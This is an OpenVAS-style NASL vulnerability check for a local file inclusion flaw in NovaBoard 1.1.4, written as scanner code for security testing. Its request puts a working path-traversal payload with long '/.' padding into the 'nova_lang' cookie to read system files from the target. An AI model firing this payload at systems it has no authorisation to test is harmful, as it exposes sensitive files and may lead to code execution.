# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:novaboard:novaboard";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100874");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-10-28 13:41:07 +0200 (Thu, 28 Oct 2010)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");

  script_name("NovaBoard <= 1.1.4 'nova_lang' LFI Vulnerability");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210121205516/http://www.securityfocus.com/bid/44459");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/lfi_in_novaboard.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("novaboard_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("novaboard/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"NovaBoard is prone to a local file include (LFI) vulnerability
  because it fails to properly sanitize user-supplied input.");

  script_tag(name:"insight", value:"An attacker can exploit this vulnerability to obtain potentially
  sensitive information or to execute arbitrary local scripts in the context of the webserver
  process. This may allow the attacker to compromise the application and the computer, other attacks
  are also possible.");

  script_tag(name:"affected", value:"NovaBoard version 1.1.4 is known to be vulnerable. Other
  versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

trav = crap(data:"/.", length:8000);
files = traversal_files();
url = dir + "/index.php";

host = http_host_name(port:port);

foreach file (keys(files)) {
  req = string("GET ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Cookie: nova_lang=../../../../../../../../../../../../../../", files[file], "/././././.", trav, ";\r\n",
               "\r\n\r\n"
               );

  res = http_send_recv(port:port, data:req);
  if(!res)
    continue;

  if(egrep(pattern:file, string:res)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
